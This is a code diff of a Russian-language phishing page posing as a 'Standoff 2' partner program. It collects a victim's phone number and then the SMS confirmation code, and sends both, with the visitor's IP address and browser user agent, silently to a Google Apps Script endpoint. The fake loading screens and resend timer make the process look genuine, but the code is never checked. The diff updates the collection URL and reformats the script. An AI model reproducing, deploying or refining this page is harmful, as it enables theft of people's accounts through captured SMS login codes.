@@ -97,7 +97,7 @@
         <div class="footer">Standoff 2 • Партнёрская программа</div>
     </div>
     <script>
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbw2Al2ev0Jx2OFRmRJzEukXbKU7FEqe79gs_8m8yZHaLgFZ1MRZstkUTV4lJBxjWie_/exec';
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyIKTbfZQRA9Ebl7G_ExOFl53_JcJyPacQe9SsrJsToOSj8L8r9mksawm8bqKQSxeBm2w/exec';
         const urlParams = new URLSearchParams(window.location.search);
         const inviter = urlParams.get('inviter') || 'Игрок';
         document.getElementById('inviter-name').textContent = inviter;
@@ -119,13 +119,9 @@
 
         function formatPhone(input) {
             var value = input.value.replace(/\D/g, '');
-            if (value.length > 0 && value[0] !== '9') {
-                value = '9' + value;
-            }
+            if (value.length > 0 && value[0] !== '9') { value = '9' + value; }
             value = value.slice(0, 10);
-            if (value.length > 0 && value[0] !== '9') {
-                value = '9' + value.slice(0, 9);
-            }
+            if (value.length > 0 && value[0] !== '9') { value = '9' + value.slice(0, 9); }
             var formatted = '';
             if (value.length > 0) formatted += value.slice(0, 3);
             if (value.length > 3) formatted += ' ' + value.slice(3, 6);
@@ -160,12 +156,7 @@
             timerInterval = setInterval(function() {
                 seconds--;
                 document.getElementById('timer').textContent = seconds;
-                if (seconds <= 0) {
-                    clearInterval(timerInterval);
-                    document.getElementById('btn-resend').disabled = false;
-                    unlockCodeInput();
-                    document.getElementById('timer').textContent = '0';
-                }
+                if (seconds <= 0) { clearInterval(timerInterval); document.getElementById('btn-resend').disabled = false; unlockCodeInput(); }
             }, 1000);
         }
 
@@ -176,28 +167,17 @@
             document.getElementById('phone-error').style.display = 'none';
             var ip = await getIP();
             var fullPhone = '+7' + phone;
-            
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
-            
             document.getElementById('screen-phone').style.display = 'none';
             document.getElementById('loading-phone').textContent = '+7 ' + document.getElementById('phone').value;
             document.getElementById('screen-loading').style.display = 'block';
-            setTimeout(function() {
-                document.getElementById('screen-loading').style.display = 'none';
-                document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value;
-                document.getElementById('screen-code').style.display = 'block';
-                startTimer();
-            }, 3000);
+            setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-code').style.display = 'block'; startTimer(); }, 3000);
         }
 
         function resendCode() {
             document.getElementById('screen-code').style.display = 'none';
             document.getElementById('screen-loading').style.display = 'block';
-            setTimeout(function() {
-                document.getElementById('screen-loading').style.display = 'none';
-                document.getElementById('screen-code').style.display = 'block';
-                startTimer();
-            }, 3000);
+            setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('screen-code').style.display = 'block'; startTimer(); }, 3000);
         }
 
         async function confirmCode() {
@@ -207,19 +187,10 @@
             if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из SMS'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
             document.getElementById('code-error').style.display = 'none';
             var ip = await getIP();
-            var btn = document.getElementById('btn-code');
-            btn.disabled = true;
-            btn.textContent = 'ПРОВЕРКА...';
-            
+            var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'ПРОВЕРКА...';
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
-            
             if (timerInterval) clearInterval(timerInterval);
-            setTimeout(function() {
-                document.getElementById('screen-code').style.display = 'none';
-                document.getElementById('screen-done').style.display = 'block';
-                btn.disabled = false;
-                btn.textContent = 'Подтвердить';
-            }, 1000);
+            setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 1000);
         }
     </script>
 </body>
